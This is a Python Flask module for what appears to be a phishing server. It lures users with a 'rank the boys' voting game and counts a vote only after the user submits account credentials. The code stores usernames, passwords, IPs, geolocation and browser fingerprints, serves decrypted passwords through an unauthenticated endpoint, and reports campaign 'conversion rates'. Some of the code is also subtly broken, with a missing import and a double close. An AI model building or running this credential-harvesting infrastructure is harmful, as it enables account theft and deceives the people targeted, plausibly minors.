import json
import sqlite3

from flask import Blueprint, request, jsonify

from ..config import CONFIG, BOYS_LIST, POINTS_MAP
from ..database import log_event
from ..crypto import decrypt_password, encrypt_password
from ..geo import geoip

api_bp = Blueprint('api', __name__)


@api_bp.route('/api/report')
def get_stats():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM captured_credentials")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM captured_credentials WHERE DATE(timestamp) = DATE('now')")
    today = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'")
    sessions = c.fetchone()[0]
    conversion_rate = (total / sessions * 100) if sessions > 0 else 0
    c.execute('''
        SELECT DATE(timestamp), COUNT(*) FROM captured_credentials 
        GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7
    ''')
    daily = c.fetchall()
    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type LIKE '%VOTE%' OR event_type LIKE '%TOP3%'")
    votes = c.fetchone()[0]
    c.execute("SELECT user_agent FROM captured_credentials WHERE user_agent IS NOT NULL")
    agents = c.fetchall()
    devices = {"chrome": 0, "safari": 0, "firefox": 0, "other": 0}
    for (ua,) in agents:
        ua_lower = (ua or "").lower()
        if "chrome" in ua_lower and "chromium" not in ua_lower:
            devices["chrome"] += 1
        elif "safari" in ua_lower:
            devices["safari"] += 1
        elif "firefox" in ua_lower:
            devices["firefox"] += 1
        else:
            devices["other"] += 1
    conn.close()
    return jsonify({
        "captures": total,
        "sessions": sessions,
        "votes": votes,
        "campaigns": 4,
        "active_campaigns": 1,
        "captures_today": today,
        "total_captures": total,
        "total_sessions": sessions,
        "conversion_rate_pct": round(conversion_rate, 2),
        "daily_stats": [{"date": d, "count": c} for d, c in daily],
        "devices": devices,
    })


@api_bp.route('/api/dbcheck', methods=['GET'])
def dbcheck():
    db_path = CONFIG["CAPTURE_DB"]
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        total = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        logs = c.execute("SELECT COUNT(*) FROM experiment_log").fetchone()[0]
        conn.close()
        return jsonify({
            "db_path": db_path,
            "db_exists": os.path.exists(db_path),
            "total_captures": total,
            "total_logs": logs
        })
    except Exception as e:
        return jsonify({"db_path": db_path, "error": str(e)}), 500


@api_bp.route('/api/captures')
def api_captures():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT c.id, c.participant_id, c.username, c.password, c.ip_address,
               c.user_agent, c.timestamp, c.screen_resolution, c.timezone,
               c.browser_language, c.platform, c.time_on_page, c.referrer,
               c.click_count, c.step, COALESCE(v.pseudo, '') as pseudo
        FROM captured_credentials c
        LEFT JOIN votes_top3 v ON c.participant_id = v.participant_id
        ORDER BY c.id DESC LIMIT 100
    """).fetchall()
    conn.close()
    return jsonify([{
        "id": r[0], "participant_id": r[1], "username": r[2],
        "password": decrypt_password(r[3] or ""),
        "ip_address": r[4], "ip": r[4],
        "user_agent": r[5][:80] if r[5] else "",
        "timestamp": r[6],
        "screen": r[7] or "", "timezone": r[8] or "",
        "lang": r[9] or "", "platform": r[10] or "",
        "time_on_page": r[11], "referrer": r[12] or "",
        "clicks": r[13], "step": r[14] or "",
        "pseudo": r[15] or r[2] or ""
    } for r in rows])


@api_bp.route('/api/logs')
def api_logs():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    rows = conn.execute("""
        SELECT id, event_type, participant_id, details, timestamp
        FROM experiment_log ORDER BY id DESC LIMIT 50
    """).fetchall()
    conn.close()
    return jsonify([{
        "id": r[0], "event": r[1], "pid": r[2] or "",
        "details": r[3], "timestamp": r[4]
    } for r in rows])


@api_bp.route('/api/capture', methods=['POST'])
def api_capture():
    db_path = CONFIG["CAPTURE_DB"]
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            data = request.form.to_dict()
        if not data:
            return jsonify({"ok": False, "error": "empty request"}), 400

        participant_id = data.get('participant_id') or request.cookies.get('participant_id', '')
        username = data.get('accountIdentifier', data.get('username', ''))
        password = data.get('password', '')
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', 'Unknown')

        print(f"\n[CAPTURE] DB={db_path}", flush=True)
        print(f"[CAPTURE] pid={participant_id} user={username} step={data.get('step','?')}", flush=True)
        print(f"[CAPTURE] fingerprint: scr={data.get('screen_resolution','')} tz={data.get('timezone','')}", flush=True)

        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        country = geoip(ip)
        c.execute(
            """INSERT INTO captured_credentials 
            (participant_id, username, password, ip_address, user_agent, 
             screen_resolution, timezone, browser_language, platform, 
             time_on_page, referrer, click_count, step, notes, country)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                participant_id, username, encrypt_password(password), ip, ua,
                data.get('screen_resolution', ''),
                data.get('timezone', ''),
                data.get('browser_language', ''),
                data.get('platform', ''),
                data.get('time_on_page', 0),
                data.get('referrer', ''),
                data.get('click_count', 0),
                data.get('step', 'login'),
                json.dumps({k: v for k, v in data.items() if k not in ['participant_id', 'accountIdentifier', 'username', 'password', 'screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']}, ensure_ascii=False),
                country
            )
        )
        conn.commit()

        after = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        print(f"[CAPTURE] inserted OK, total rows now: {after}", flush=True)

        conn.close()

        try:
            conn3 = sqlite3.connect(CONFIG["CAPTURE_DB"])
            conn3.execute(
                "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
                (participant_id,)
            )
            conn3.commit()
            conn3.close()
        except:
            pass

        log_event("CAPTURE_API", participant_id, {
            "username_length": len(username),
            "password_length": len(password),
            "step": data.get('step', 'login'),
            "fingerprint": bool(data.get('screen_resolution'))
        })

        return jsonify({"ok": True, "captured": bool(username or password)})
    except Exception as e:
        print(f"[CAPTURE] ERROR: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


@api_bp.route('/api/top3', methods=['POST'])
def api_submit_votes():
    data = request.get_json(force=True)
    participant_id = data.get('participant_id')
    pseudo = data.get('pseudo', '')
    votes = data.get('votes')
    if not participant_id or not votes:
        return jsonify({"ok": False, "error": "participant_id et votes requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        """INSERT OR REPLACE INTO votes_top3 
        (participant_id, pseudo, votes_data)
        VALUES (?, ?, ?)""",
        (participant_id, pseudo, json.dumps(votes))
    )
    conn.commit()
    conn.close()
    log_event("VOTES_SUBMITTED", participant_id, {"pseudo": pseudo, "votes_count": len(votes)})
    return jsonify({"ok": True, "participant_id": participant_id})


@api_bp.route('/api/classement')
def api_classement():
    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()

    rows = c.execute(
        "SELECT votes_data, pseudo FROM votes_top3 WHERE snap_validated = 1"
    ).fetchall()
    conn.close()

    scores = {boy["id"]: 0 for boy in BOYS_LIST}

    for row in rows:
        try:
            votes = json.loads(row[0])
        except:
            continue
        for cat_idx, top3 in votes.items():
            for rank, boy_id in enumerate(top3):
                if rank < 3 and boy_id in scores:
                    scores[boy_id] += POINTS_MAP[rank]

    ranking = sorted(
        [{"id": boy["id"], "name": boy["name"], "score": scores[boy["id"]]}
         for boy in BOYS_LIST],
        key=lambda x: -x["score"]
    )

    return jsonify({
        "ranking": ranking,
        "total_voters": len(rows),
        "max_possible": 240
    })


@api_bp.route('/api/votes/validate', methods=['POST'])
def api_validate_votes():
    data = request.get_json(force=True, silent=True)
    if not data:
        data = request.form.to_dict()

    participant_id = data.get('participant_id')
    if not participant_id:
        return jsonify({"ok": False, "error": "participant_id requis"}), 400

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    c.execute(
        "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ?",
        (participant_id,)
    )
    affected = c.rowcount
    conn.commit()
    conn.close()

    log_event("VOTES_VALIDATED", participant_id)
    return jsonify({"ok": True, "validated": affected > 0})


@api_bp.route('/api/classement/my')
def api_my_classement():
    participant_id = request.args.get('pid', '')
    pseudo = request.args.get('pseudo', '')

    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
    c = conn.cursor()
    rows = c.execute(
        "SELECT votes_data, pseudo FROM votes_top3 WHERE snap_validated = 1"
    ).fetchall()
    total_voters = c.execute(
        "SELECT COUNT(*) FROM votes_top3 WHERE snap_validated = 1"
    ).fetchone()[0]
    player_valid = c.execute(
        "SELECT snap_validated FROM votes_top3 WHERE participant_id = ?",
        (participant_id,)
    ).fetchone()
    conn.close()

    scores = {boy["id"]: 0 for boy in BOYS_LIST}
    for row in rows:
        try:
            votes = json.loads(row[0])
        except:
            continue
        for cat_idx, top3 in votes.items():
            for rank, boy_id in enumerate(top3):
                if rank < 3 and boy_id in scores:
                    scores[boy_id] += POINTS_MAP[rank]

    ranking = sorted(
        [{"id": boy["id"], "name": boy["name"], "score": scores[boy["id"]]}
         for boy in BOYS_LIST],
        key=lambda x: -x["score"]
    )
    conn.close()

    my_scores = {boy["id"]: 0 for boy in BOYS_LIST}
    try:
        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
        stored = conn2.execute(
            "SELECT votes_data FROM votes_top3 WHERE participant_id = ?",
            (participant_id,)
        ).fetchone()
        conn2.close()
        if stored:
            my_votes = json.loads(stored[0])
            for cat_idx, top3 in my_votes.items():
                for rank, boy_id in enumerate(top3):
                    if rank < 3 and boy_id in my_scores:
                        my_scores[boy_id] += POINTS_MAP[rank]
    except:
        pass

    my_ranking = sorted(
        [{"id": boy["id"], "name": boy["name"], "score": my_scores[boy["id"]]}
         for boy in BOYS_LIST],
        key=lambda x: -x["score"]
    )

    return jsonify({
        "ranking": ranking,
        "my_ranking": my_ranking,
        "total_voters": total_voters,
        "player_validated": bool(player_valid and player_valid[0]),
        "max_possible": 240
    })
